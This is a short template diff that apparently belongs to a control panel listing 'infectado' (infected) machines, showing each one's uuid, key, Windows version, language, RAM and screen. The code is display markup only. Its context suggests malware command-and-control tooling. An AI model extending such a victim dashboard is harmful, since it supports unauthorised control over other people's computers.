@@ -4,7 +4,10 @@
         <dd class="col-sm-9">
             <dl class="row">
                 <dd class="col-sm-9">{{ infectado.borocito }}</dd>
-                {% if infectado.key %}<dd class="col-sm-9">{{ infectado.key }}</dd>{% endif %}
+                {% if infectado.key %}<dd class="col-sm-9">
+                    <b>{{infectado.uuid}}</b><br>
+                    <em>{{ infectado.key }}</em>
+                </dd>{% endif %}
             </dl>
         </dd>
 
@@ -19,7 +22,7 @@
             <dl class="row">
                 <dd class="col-sm-8">{{ infectado.windows }}</dd>
                 <dd class="col-sm-8">{{ infectado.language }}</dd>
-                <dd class="col-sm-8"><b>RAM</b> {{ infectado.ram }}</dd>
+                <dd class="col-sm-8"><b>RAM</b> <span title="{{ infectado.ram }}">{{ infectado.ram_convert }}</span></dd>
                 <dd class="col-sm-8"><b>Screen</b> {{ infectado.screen }}</dd>
             </dl>
         </dd>
